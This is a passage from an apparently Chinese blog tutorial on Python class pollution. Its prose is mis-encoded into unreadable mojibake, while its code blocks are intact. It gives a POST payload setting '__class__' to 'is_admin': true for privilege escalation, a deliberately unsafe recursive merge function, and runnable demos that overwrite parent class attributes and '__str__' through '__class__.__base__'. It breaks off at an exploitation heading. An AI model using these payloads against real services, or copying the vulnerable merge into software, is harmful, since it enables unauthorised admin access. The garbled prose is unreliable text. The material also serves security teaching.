</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;is_admin&#34;: true
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞±ÂèØ‰ª•ÊääËá™Â∑±ÂèòÊàêÁÆ°ÁêÜÂëò‰∫Ü</p>
<p>‰∏ç‰ªÖÂ¶ÇÊ≠§ÔºåÊîªÂáªËÄÖËøòÂèØ‰ª•Â∞ùËØï‰øÆÊîπÂÖ∂‰ªñÂÖ≥ÈîÆÂ±ûÊÄßÊàñÂµåÂ•óÂØπË±°„ÄÇ‰æãÂ¶ÇÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /update_config
</span></span><span class="line"><span class="cl">Content-Type: application/json
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;: {
</span></span><span class="line"><span class="cl">        &#34;is_admin&#34;: true
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="Âç±Èô©‰ª£Á†ÅÊÆµÂêàÂπ∂ÂáΩÊï∞">Âç±Èô©‰ª£Á†ÅÊÆµÔºàÂêàÂπ∂ÂáΩÊï∞Ôºâ
</h2><p>Â∞±ÂÉè<code>Javascript</code>ÁöÑÂéüÂûãÈìæÊ±°Êüì‰∏ÄÊ†∑ÔºåÂêåÊ†∑ÈúÄË¶Å‰∏Ä‰∏™Êï∞ÂÄºÂêàÂπ∂ÂáΩÊï∞Â∞ÜÁâπÂÆöÂÄºÊ±°ÊüìÂà∞Á±ªÁöÑÂ±ûÊÄßÂΩì‰∏≠Ôºå‰∏Ä‰∏™Ê†áÂáÜÁ§∫‰æãÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂØπsrc‰∏≠ÁöÑÈîÆÂÄºÂØπËøõË°å‰∫ÜÈÅçÂéÜÔºåÁÑ∂ÂêéÊ£ÄÊü•dst‰∏≠ÊòØÂê¶Âê´Êúâ<code>__getitem__</code>Â±ûÊÄßÔºå‰ª•Ê≠§Êù•Âà§Êñ≠dstÊòØÂê¶‰∏∫Â≠óÂÖ∏„ÄÇÂ¶ÇÊûúÂ≠òÂú®ÁöÑËØùÔºåÊ£ÄÊµãdst‰∏≠ÊòØÂê¶Â≠òÂú®Â±ûÊÄßk‰∏îvalueÊòØÂê¶ÊòØ‰∏Ä‰∏™Â≠óÂÖ∏ÔºåÂ¶ÇÊûúÊòØÁöÑËØùÔºåÂ∞±ÁªßÁª≠ÂµåÂ•ómergeÂØπÂÜÖÈÉ®ÁöÑÂ≠óÂÖ∏ÂÜçËøõË°åÈÅçÂéÜÔºåÂ∞ÜÂØπÂ∫îÁöÑÊØè‰∏™ÈîÆÂÄºÂØπÈÉΩÂèñÂá∫Êù•„ÄÇÂ¶ÇÊûú‰∏çÂ≠òÂú®ÁöÑËØùÂ∞±Â∞Üsrc‰∏≠ÁöÑvalueÁöÑÂÄºËµãÂÄºÁªôdstÂØπÂ∫îÁöÑkeyÁöÑÂÄº„ÄÇ</p>
<p>Â¶ÇÊûúdst‰∏çÂê´ÊúâgetitemÂ±ûÊÄßÁöÑËØùÔºåÈÇ£Â∞±ËØ¥Êòédst‰∏çÊòØ‰∏Ä‰∏™Â≠óÂÖ∏ÔºåÂ∞±Áõ¥Êé•Ê£ÄÊµãdst‰∏≠ÊòØÂê¶Â≠òÂú®kÁöÑÂ±ûÊÄßÔºåÂπ∂Ê£ÄÊµãËØ•Â±ûÊÄßÂÄºÊòØÂê¶‰∏∫Â≠óÂÖ∏ÔºåÂ¶ÇÊûúÊòØÁöÑËØùÂ∞±ÂÜçÈÄöËøámergeÂáΩÊï∞ËøõË°åÈÅçÂéÜÔºåÂ∞Ük‰Ωú‰∏∫dstÔºåv‰Ωú‰∏∫srcÔºåÁªßÁª≠ÂèñÂá∫vÈáåÈù¢ÁöÑÈîÆÂÄºÂØπËøõË°åÈÅçÂéÜ„ÄÇ</p>
<p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂØπsrcÁöÑÊéßÂà∂ÔºåÊù•ÊéßÂà∂dstÁöÑÂÄºÔºåÊù•ËææÂà∞Êàë‰ª¨Ê±°ÊüìÁöÑÁõÆÁöÑ„ÄÇ</p>
<h2 id="Ê±°ÊüìËøáÁ®ãÂàÜÊûê">Ê±°ÊüìËøáÁ®ãÂàÜÊûê
</h2><p>Áî±‰∫é<code>Python</code>‰∏≠ÁöÑÁ±ª‰ºöÁªßÊâøÁà∂Á±ª‰∏≠ÁöÑÂ±ûÊÄßÔºåËÄåÁ±ª‰∏≠Â£∞ÊòéÔºàÂπ∂‰∏çÊòØÂÆû‰æã‰∏≠Â£∞ÊòéÔºâÁöÑÂ±ûÊÄßÊòØÂîØ‰∏ÄÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÁöÑÁõÆÊ†áÂ∞±ÊòØËøô‰∫õÂú®Â§ö‰∏™Á±ª„ÄÅÁ§∫‰æã‰∏≠‰ªçÁÑ∂ÊåáÂêëÂîØ‰∏ÄÁöÑÂ±ûÊÄßÔºåÂ¶ÇÁ±ª‰∏≠Ëá™ÂÆö‰πâÂ±ûÊÄßÂèä‰ª•<code>__</code>ÂºÄÂ§¥ÁöÑÂÜÖÁΩÆÂ±ûÊÄßÁ≠â</p>
<p>‰ª•Ëá™ÂÆö‰πâÂ±ûÊÄß‰∏∫‰æãÂ≠êÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">father</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;haha&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_a</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_b</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">son_b</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__class__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__base__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;secret&#34;</span> <span class="p">:</span> <span class="s2">&#34;no way&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">son_a</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#haha</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">instance</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#haha</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">son_a</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#no way</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">instance</span><span class="o">.</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#no way</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êàë‰ª¨Ê®°‰ªø‰∏ÄÈÅçÊ±°ÊüìËøáÁ®ãËøõË°å‰∏Ä‰∏ãË∞ÉËØïÂàÜÊûêÔºåÊääÊñ≠ÁÇπ‰∏ãÂú®mergeÊìç‰Ωú‰∏ãÔºö</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327163834420.png"
	width="1826"
	height="595"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327163834420_hu4948614204224292809.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327163834420_hu13339697526907735676.png 1024w"
	loading="lazy"
	
		alt="image-20250327163834420"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="736px"
	
></p>
<p>ÁÑ∂ÂêéÊàë‰ª¨ÂèëÁé∞ÔºåÊàë‰ª¨Ëá™Ë°åÊéßÂà∂ÁöÑpayload‰Ωú‰∏∫src‰º†ÂÖ•mergeÂáΩÊï∞ÔºåÁõÆÊ†áÂÆû‰æãinstance‰Ωú‰∏∫dst‰º†ÂÖ•ÔºåÂπ∂‰∏îÂ∞ÜpayloadÂØπÂ∫îÁöÑkÂíåvÁöÑÂÄºÂèñ‰∫ÜÂá∫Êù•Ôºö</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327170354054.png"
	width="1820"
	height="557"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327170354054_hu17534074199655432365.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327170354054_hu12157283980069464104.png 1024w"
	loading="lazy"
	
		alt="image-20250327170354054"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="784px"
	
></p>
<p>Âõ†‰∏∫v‰∏≠‰∏çÂ≠òÂú®<code>__getitem__</code>ÔºåÊâÄ‰ª•Ë∑≥Âà∞‰∫ÜelifËØ≠Âè•‰∏ãÈù¢ÔºåÂèàÂõ†‰∏∫vË¢´ËØÜÂà´‰∏∫‰∫Üdict:1,Ë°®ÊòévÊòØ‰∏Ä‰∏™Â≠óÂÖ∏‰∏î‰∏ãÈù¢ËøòÊúâ‰∏Ä‰∏™ÈîÆÂÄºÂØπÔºåÊâÄ‰ª•ËøõÂÖ•elifËØ≠Âè•‰∏ãÈù¢Ôºå‰∫éÊòØÈÄíÂΩíÂ∞Üv‰Ωú‰∏∫srcÂÜçËµ∞‰∏ÄÈÅçmergeÂáΩÊï∞Ôºö</p>
<p>Áõ¥Âà∞Á¨¨‰∏âÈÅçÔºåÈÅçÂéÜÂà∞ÊúÄÈáåÈù¢ÁöÑsecret:noway‰ª•ÂêéËøõÂÖ•elseÁöÑsetattrÂáΩÊï∞Ôºö</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327171050901.png"
	width="1762"
	height="397"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327171050901_hu4355303253444657450.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250327171050901_hu4674317121025727308.png 1024w"
	loading="lazy"
	
		alt="image-20250327171050901"
	
	
		class="gallery-image" 
		data-flex-grow="443"
		data-flex-basis="1065px"
	
></p>
<p>ÁÑ∂ÂêéÂÆåÊàêdst.k=vÁöÑÊ±°ÊüìÔºåËøôÊ†∑Êàë‰ª¨Â∞±Â∞Üinstance.secret=nowayÊ±°ÊüìÊàêÂäü</p>
<p>‰øÆÊîπÂÜÖÁΩÆÂ±ûÊÄß‰πüÊòØÁ±ª‰ººÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">father</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_a</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">son_b</span><span class="p">(</span><span class="n">father</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="n">son_b</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__class__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__base__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__str__&#34;</span> <span class="p">:</span> <span class="s2">&#34;Polluted ~&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="fm">__str__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#&lt;slot wrapper &#39;__str__&#39; of &#39;object&#39; objects&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">father</span><span class="o">.</span><span class="fm">__str__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Polluted ~</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="Êó†Ê≥ïÊ±°ÊüìÁöÑobject">Êó†Ê≥ïÊ±°ÊüìÁöÑ<code>Object</code>
</h3><p>Ê≠£Â¶ÇÂâçÈù¢ÊâÄËø∞ÔºåÂπ∂‰∏çÊòØÊâÄÊúâÁöÑÁ±ªÁöÑÂ±ûÊÄßÈÉΩÂèØ‰ª•Ë¢´Ê±°ÊüìÔºåÂ¶Ç<code>Object</code>ÁöÑÂ±ûÊÄßÂ∞±Êó†Ê≥ïË¢´Ê±°ÊüìÔºåÊâÄ‰ª•ÈúÄË¶ÅÁõÆÊ†áÁ±ªËÉΩÂ§üË¢´ÂàáÂÖ•ÁÇπÁ±ªÊàñÂØπË±°ÂèØ‰ª•ÈÄöËøáÂ±ûÊÄßÂÄºÊü•ÊâæËé∑ÂèñÂà∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__class__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__str__&#34;</span> <span class="p">:</span> <span class="s2">&#34;Polluted ~&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">merge</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="nb">object</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#TypeError: can&#39;t set attributes of built-in/extension type &#39;object&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="Âà©Áî®">Âà©Áî®
